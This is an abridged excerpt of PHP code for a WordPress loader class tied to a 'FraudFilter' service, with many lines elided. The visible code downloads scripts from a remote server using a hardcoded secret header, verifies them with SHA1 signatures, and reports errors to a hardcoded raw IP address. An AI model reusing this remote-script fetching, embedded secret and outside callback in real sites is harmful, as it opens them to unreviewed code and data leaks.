...
class FraudFilterWordPressLoader_gn8c7 {
    public function run() {
    ...
    function isSignatureValidTemp($sign, $time) {
        $str = '2cb319ad-30c1-441f-b117-5bc7bdb88621.'.$this->getClidTemp().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
    ...
    function getUpgradeScriptViaContentsWP($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 2cb319ad-30c1-441f-b117-5bc7bdb88621',
                'timeout' => 2
            )
        );
    ...
    function downloadScriptFirstTime($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2ValidTemp($output)) {
            ...
            $headers[] = 'x-ff-secret: 2cb319ad-30c1-441f-b117-5bc7bdb88621';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 2cb319ad-30c1-441f-b117-5bc7bdb88621';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=gn8c7&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterWordPressLoader_gn8c7 = new FraudFilterWordPressLoader_gn8c7();
$fraudFilterWordPressLoader_gn8c7->run();
